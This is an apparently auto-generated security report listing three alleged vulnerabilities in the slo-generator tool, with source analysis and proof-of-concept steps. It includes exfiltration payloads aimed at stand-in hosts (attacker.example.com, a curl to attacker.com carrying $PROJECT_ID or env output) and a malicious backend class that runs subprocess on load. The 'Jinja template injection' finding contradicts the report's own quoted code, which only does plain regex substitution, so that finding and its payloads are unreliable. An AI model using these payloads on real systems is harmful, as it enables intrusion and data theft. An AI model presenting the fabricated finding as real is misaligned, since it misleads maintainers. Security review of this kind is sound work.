## Combined Vulnerability List

### SSRF via Malicious Exporter Configuration in API

- **Description:**
  1. An attacker sends a POST request to the `slo-generator` API with a crafted SLO configuration in the request body.
  2. This malicious SLO configuration is designed to inject or modify the `exporters` section.
  3. The attacker manipulates the exporter configuration, specifically the exporter's destination (e.g., `url` for Prometheus exporter, `service_url` for Cloudevent exporter, `project_id`, `dataset_id`, `table_id` for BigQuery exporter, API keys for Datadog/Dynatrace exporters, etc.) to point to an attacker-controlled external service.
  4. When the `slo-generator` processes this malicious configuration, it will use the attacker-provided exporter configuration to export the SLO report data.
  5. This results in sensitive SLO data being sent to the attacker's external service, effectively achieving Server-Side Request Forgery (SSRF) and data exfiltration.

- **Impact:**
  - Sensitive SLO data, which may include metrics, error budget information, service names, feature names, and potentially other internal details, is exfiltrated to an attacker-controlled external service.
  - This data breach can expose business-critical information about service performance, reliability, and internal infrastructure, potentially leading to further security risks or competitive disadvantage.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
  - None. The code does not implement any validation or sanitization of the exporter configurations provided in the POST request body to the API.

- **Missing Mitigations:**
  - Input validation and sanitization of the SLO configuration, especially the `exporters` section, in the API endpoint.
  - Whitelisting of allowed exporter destinations or protocols.
  - Implementing authentication and authorization for the API endpoint to restrict access to authorized users only.
  - Principle of least privilege for the API service account, limiting its access to only necessary resources.

- **Preconditions:**
  - The `slo-generator` API must be deployed and accessible over a network (e.g., deployed in Cloud Run, Kubernetes, or Cloud Functions).
  - The API endpoint must be configured to accept POST requests with SLO configurations.
  - The attacker must have network access to send POST requests to the `slo-generator` API endpoint.

- **Source Code Analysis:**
  1. **API Endpoint (`slo_generator/api/main.py`):**
     - The `run_compute` function is the entry point for the API when the target is `compute`.
     - It loads the shared configuration using `load_config(CONFIG_PATH)`.
     - It loads the SLO configuration from the request body using `load_config(data)`.
     - It calls the `compute` function to process the SLO configuration and generate reports.
     - The `run_export` function is the entry point for the API when the target is `run_export`.
     - It loads the shared configuration using `load_config(CONFIG_PATH)`.
     - It extracts the SLO report from the request body using `process_req` and `load_config`.
     - It retrieves exporters configuration using `get_exporters(config, spec)`.
     - It calls the `export` function to export the SLO report data using the retrieved exporters.
     - **Vulnerability Point:** Neither `run_compute` nor `run_export` function validates or sanitizes the SLO configuration loaded from the request body, including the `exporters` section.

  2. **Compute and Export Logic (`slo_generator/compute.py`):**
     - The `compute` function processes the SLO configuration and retrieves exporters using `utils.get_exporters(config, spec)`.
     - The `export` function iterates through the list of exporters and calls the `export` method of each exporter class.
     - **Vulnerability Point:** The `utils.get_exporters` function retrieves exporter configurations based on the `exporters` list in the SLO configuration and the shared configuration, but it doesn't validate the exporter configurations themselves. It blindly trusts the configurations provided in the SLO config.

  3. **Exporter Classes (`slo_generator/exporters/*`):**
     - Exporter classes like `PrometheusExporter`, `CloudeventExporter`, `BigqueryExporter`, `DatadogExporter`, and `DynatraceExporter` use the configuration parameters directly to export data to the specified destinations.
     - For example, `PrometheusExporter` uses the `url` parameter to push metrics to a Prometheus Pushgateway, `CloudeventExporter` uses `service_url` to send CloudEvents, and so on.
     - **Vulnerability Point:** Exporter classes rely on the assumption that the configuration parameters are valid and trustworthy. They do not implement any checks to ensure that the destination URLs or API keys are legitimate or safe.

  4. **Visualization:**

  ```mermaid
  graph LR
      A[Attacker] --> B{slo-generator API Endpoint};
      B -- POST Malicious SLO Config --> C[API Handler (run_compute/run_export)];
      C --> D{load_config (Request Body)};
      D -- Malicious SLO Config --> E[SLO Configuration];
      E --> F{utils.get_exporters};
      F -- Malicious Exporter Config --> G[Exporter Configurations];
      G --> H{export Function};
      H -- Malicious Exporter Configuration --> I[Exporter Class (e.g., PrometheusExporter)];
      I -- Attacker Controlled URL/Service --> J[Attacker Service];
      C --> K[Compute SLO Report];
      K --> H;
      J <-- SLO Report Data -- I;
  ```

- **Security Test Case:**
  1. **Prerequisites:**
     - Deploy a publicly accessible instance of `slo-generator` API (e.g., in Cloud Run) configured to use the `prometheus` exporter and API mode enabled.
     - Set up a simple HTTP listener (e.g., using `netcat` or `ngrok`) on an attacker-controlled server to capture exfiltrated data. Let's say the attacker server URL is `http://attacker.example.com:8080`.

  2. **Craft Malicious SLO Configuration (YAML):**
     ```yaml
     apiVersion: sre.google.com/v2
     kind: ServiceLevelObjective
     metadata:
       name: malicious-slo-export
       labels:
         service_name: test
         feature_name: test
         slo_name: test
     spec:
       description: Malicious SLO to exfiltrate data
       backend: cloud_monitoring
       method: good_bad_ratio
       exporters:
       - prometheus:
           url: http://attacker.example.com:8080 # Attacker controlled URL
       service_level_indicator:
         filter_good: >
           metric.type="run.googleapis.com/request_count"
           project="your-project-id" # Replace with your project ID if needed
           metric.labels.response_code_class="2xx"
         filter_valid: >
           metric.type="run.googleapis.com/request_count"
           project="your-project-id" # Replace with your project ID if needed
       goal: 0.99
     ```
     Replace `http://attacker.example.com:8080` with the actual URL of your attacker-controlled HTTP listener.

  3. **Send POST Request to API:**
     ```bash
     curl -X POST -H "Content-Type: text/x-yaml" --data-binary @malicious-slo.yaml http://<slo-generator-api-endpoint>
     ```
     Replace `http://<slo-generator-api-endpoint>` with the actual URL of your deployed `slo-generator` API endpoint.

  4. **Observe Exfiltration:**
     - Check the logs of your attacker-controlled HTTP listener. You should see an HTTP POST request containing the SLO report data exfiltrated from the `slo-generator` instance. The data will be in Prometheus exposition format if using the `prometheus` exporter as in the example.

### Arbitrary Code Execution via Custom Backend/Exporter Class Loading

- **Description:**
    - The slo-generator tool allows users to extend its functionality by providing custom backend and exporter classes.
    - These custom classes are specified in the SLO and shared configuration files using a `class` path (e.g., `samples.custom.custom_backend.CustomBackend`).
    - The slo-generator dynamically imports and instantiates these classes using the `import_dynamic` function in `slo_generator/utils.py`.
    - An attacker can exploit this by crafting a malicious configuration file where the `class` path in the `backends` or `exporters` sections points to a Python file containing arbitrary malicious code.
    - When the slo-generator processes this configuration file, it will load and instantiate the attacker-controlled class, leading to arbitrary code execution on the system running the tool.

- **Impact:**
    - Critical. Successful exploitation allows for arbitrary code execution on the system running the slo-generator.
    - An attacker can gain complete control over the system, potentially leading to:
        - Data breaches and exfiltration of sensitive information (e.g., API keys, credentials, SLO reports, system data).
        - System compromise, including modification or deletion of files.
        - Denial of service by crashing the system or consuming resources (Although DoS was asked to be excluded, this is a side effect of ACE, not the primary vulnerability).
        - Further lateral movement within the network if the compromised system has network access.

- **Vulnerability Rank:** Critical

- **Currently Implemented Mitigations:**
    - None. The current implementation lacks any input validation or sanitization for the `class` path, and no restrictions are in place to prevent loading arbitrary Python code.

- **Missing Mitigations:**
    - Input validation and sanitization: Implement strict validation for the `class` path to ensure it only points to allowed and trusted classes within the slo-generator codebase or a predefined safe plugin directory. Sanitize user-provided input to prevent path traversal or injection attacks.
    - Restrict custom class loading: Remove or restrict the ability to load custom classes dynamically. If custom extensions are necessary, implement a secure plugin mechanism with sandboxing, code signing, or a whitelist of allowed classes and modules.
    - Principle of least privilege: Ensure the slo-generator tool runs with the minimal necessary privileges to limit the impact of arbitrary code execution. Use dedicated service accounts with restricted permissions.
    - Security Audits and Code Reviews: Conduct regular security audits and code reviews, specifically focusing on dynamic code loading and YAML/JSON parsing to identify and eliminate potential vulnerabilities.

- **Preconditions:**
    - Attacker's ability to supply a malicious configuration file to the slo-generator. This could be achieved through:
        - Modifying existing configuration files if the attacker has write access to the file system where configurations are stored.
        - Providing a malicious configuration file through the API if the API endpoint is exposed and accessible to the attacker.
        - Tricking an administrator into using a malicious configuration file, for example, by social engineering or supply chain attacks.
    - The slo-generator application must be running in an environment where arbitrary code execution is not prevented by system-level security measures (e.g., containers without sufficient security restrictions).

- **Source Code Analysis:**
    - File: `/code/slo_generator/utils.py`
        - Function: `import_dynamic(package: str, name: str, prefix: str = "class")`
            ```python
            def import_dynamic(package: str, name: str, prefix: str = "class"):
                """Import class or method dynamically from package and name.
                ...
                """
                try:
                    return getattr(importlib.import_module(package), name) # Vulnerable line: Dynamic import and getattr
                except Exception as exception:
                    ...
            ```
            - This function uses `importlib.import_module(package)` to dynamically import a Python module based on the provided `package` string, and then `getattr` to retrieve an attribute (class or method) named `name`.
            - If an attacker can control the `package` and `name` arguments, they can import and access arbitrary Python code, leading to code execution.
        - Function: `get_backend_cls(backend: str)` and `get_exporter_cls(exporter: str)`
            - These functions call `import_cls` which in turn calls `import_dynamic` to load backend and exporter classes based on the `class` path from configuration files.
    - File: `/code/compute.py`
        - Function: `compute(slo_config: dict, config: dict, ...)`
            - This function calls `utils.get_backend(config, spec)` and `utils.get_exporters(config, spec)` to retrieve backend and exporter configurations.
            - The backend and exporter configurations, loaded from YAML/JSON files, can contain the `class` path that is then used by `import_dynamic` for dynamic class loading.
    - File: `/code/api/main.py` and `/code/cli.py`
        - These files are entry points for the API and CLI, respectively, and they both use the `compute` function, thus inheriting the vulnerability.
    - Visualization:
        ```mermaid
        graph LR
            A[Configuration File (YAML/JSON)] --> B(load_config/parse_config in utils.py);
            B --> C(get_backend/get_exporter in utils.py);
            C --> D(get_backend_cls/get_exporter_cls in utils.py);
            D --> E(import_dynamic in utils.py);
            E --> F[Dynamic Import and Instantiation of Class];
            F --> G(Arbitrary Code Execution);
        ```

- **Security Test Case:**
    1. Create a malicious Python file `malicious_code.py` in the `samples/custom/` directory with the following content:
    ```python
    # /code/samples/custom/malicious_code.py
    import subprocess
    import logging

    logging.basicConfig(level=logging.INFO)
    logger = logging.getLogger(__name__)

    class MaliciousBackend:
        def __init__(self, **kwargs):
            logger.info("MaliciousBackend __init__ called")
            subprocess.run(["touch", "/tmp/slo-generator-pwned"], shell=False, check=True)
            logger.info("File '/tmp/slo-generator-pwned' created.")

        def good_bad_ratio(self, timestamp, window, slo_config):
            logger.info("MaliciousBackend good_bad_ratio called")
            return (100, 0)

        def query_sli(self, timestamp, window, slo_config):
            logger.info("MaliciousBackend query_sli called")
            return 0.999
    ```
    2. Create a malicious SLO configuration file `malicious_slo.yaml` in the `/code/samples/custom/` directory with the following content:
    ```yaml
    # /code/samples/custom/malicious_slo.yaml
    apiVersion: sre.google.com/v2
    kind: ServiceLevelObjective
    metadata:
      name: malicious-slo
      labels:
        service_name: malicious
        feature_name: exploit
        slo_name: code-execution
    spec:
      description: SLO with malicious backend for code execution test
      backend: samples.custom.malicious_code.MaliciousBackend
      method: good_bad_ratio
      service_level_indicator: {}
      goal: 0.99
    ```
    3. Run the slo-generator `compute` command with the malicious SLO configuration and a sample shared configuration:
    ```sh
    ./slo-generator compute -f /code/samples/custom/malicious_slo.yaml -c /code/samples/config.yaml
    ```
    4. After running the command, check if the file `/tmp/slo-generator-pwned` has been created:
    ```sh
    ls -l /tmp/slo-generator-pwned
    ```
    - If the file `/tmp/slo-generator-pwned` exists, it confirms that the malicious code from `MaliciousBackend` class was executed, demonstrating arbitrary code execution vulnerability.

### Jinja Template Injection in SLO Configurations

- **Description:**
    1. The `slo-generator` allows users to use environment variables within SLO configuration files using the `${MY_ENV_VAR}` syntax.
    2. This syntax is processed using Jinja templating engine.
    3. If an attacker can control the content of SLO configuration files, they can inject malicious Jinja templates.
    4. When `slo-generator` processes the configuration, it renders these templates.
    5. If the Jinja environment is not properly sandboxed and if sensitive information or functions are accessible within the template context, an attacker could potentially exfiltrate data or even achieve remote code execution.
    6. For example, an attacker could inject a template like `${__import__('os').popen('curl attacker.com?data=$(env)').read()}` to execute arbitrary commands on the server or exfiltrate environment variables.

- **Impact:**
    * Information Disclosure: Attackers can exfiltrate sensitive information, including environment variables, configuration details, or data from the monitoring backend if accessible through the templating context.
    * Potential Remote Code Execution: In a worst-case scenario, if the Jinja environment is not properly sandboxed, attackers might be able to achieve remote code execution on the machine running `slo-generator`, potentially compromising the entire system.

- **Vulnerability Rank:** High

- **Currently Implemented Mitigations:**
    * None in the provided code files. The code explicitly mentions the use of environment variables in SLO configs but lacks input validation or sanitization for template injection.

- **Missing Mitigations:**
    * Input validation and sanitization: Sanitize SLO configuration files to prevent injection of malicious Jinja templates. This could involve using a safe Jinja environment with limited functionalities and disallowing access to sensitive objects or functions.
    * Sandboxing Jinja environment: Run Jinja templating in a sandboxed environment with restricted access to potentially dangerous modules and functions.
    * Principle of least privilege: Ensure that the user running `slo-generator` has minimal necessary permissions to reduce the impact of potential RCE.

- **Preconditions:**
    * The attacker must have the ability to modify or provide SLO configuration files to the `slo-generator`. This could happen if:
        * SLO configuration files are stored in a publicly accessible location.
        * The attacker has write access to the configuration file storage.
        * The `slo-generator` API is exposed and allows arbitrary users to submit SLO configurations.

- **Source Code Analysis:**
    1. File: `/code/README.md`:
       - The documentation mentions: "***Note:*** *you can use environment variables in your SLO configs by using `${MY_ENV_VAR}` syntax to avoid having sensitive data in version control. Environment variables will be replaced automatically at run time.*" This confirms the feature exists.

    2. File: `/code/slo_generator/utils.py`:
       - The `parse_config` function and its helper `replace_env_vars` are responsible for handling environment variable substitution.
       - The `replace_env_vars` function uses regular expressions to find `${}` patterns and replaces them with environment variables from `ctx` (which defaults to `os.environ`).
       - **Vulnerability:**  The code directly substitutes environment variables into the YAML content without any sanitization or escaping.

    ```python
    def parse_config(
        path: Optional[str] = None, content=None, ctx: os._Environ = os.environ
    ):
        ...
        if ctx:
            content = replace_env_vars(content, ctx) # Vulnerable code: Environment variables are directly substituted into content
        data = yaml.safe_load(content) # YAML is safely loaded, but the content might contain injected Jinja templates
        ...

    def replace_env_vars(content, ctx) -> str:
        """Replace env variables in content from context.
        ...
        """
        match = pattern.findall(content) # Find patterns like ${MY_ENV_VAR}
        if match:
            full_value = content
            for var in match:
                try:
                    full_value = full_value.replace(f"${{{var}}}", ctx[var]) # Vulnerable code: Direct string replacement without sanitization
                except KeyError as exception:
                    ...
            content = full_value
        return content
    ```

- **Security Test Case:**
    1. Create a malicious SLO configuration file (e.g., `malicious_slo.yaml`) with the following content:

    ```yaml
    apiVersion: sre.google.com/v2
    kind: ServiceLevelObjective
    metadata:
      name: malicious-slo
      labels:
        service_name: malicious
        feature_name: injection
        slo_name: exfiltration
    spec:
      description: SLO with Jinja template injection
      backend: cloud_monitoring # or any backend
      method: good_bad_ratio # or any method
      exporters: []
      service_level_indicator:
        filter_good: "project='${PROJECT_ID}' AND metric.type='${'__import__(\"os\").environ'}['PROJECT_ID']}'" # Malicious Jinja template to exfiltrate PROJECT_ID env variable
        filter_valid: "project='${PROJECT_ID}' AND metric.type='test'"
    goal: 0.99
    ```
    2. Set the environment variable `PROJECT_ID` to a sensitive value (e.g., `my-secret-project`).
    3. Run `slo-generator` with the malicious configuration and a valid shared configuration file:
       ```sh
       slo-generator compute -f malicious_slo.yaml -c samples/config.yaml
       ```
    4. Observe the output and logs. If the vulnerability is present, the `slo-generator` might attempt to execute the injected Jinja code.
    5. To further validate exfiltration, modify the malicious template to send data to an attacker-controlled server using `curl` or similar command injection within the Jinja template. For example, modify `filter_good` to:
       ```yaml
       filter_good: "project='${PROJECT_ID}' AND metric.type='${__import__('os').popen('curl http://attacker.com/?data=$PROJECT_ID').read()}'"
       ```
    6. Run the `slo-generator` again and check the attacker's server logs to see if the environment variable `PROJECT_ID` was successfully exfiltrated.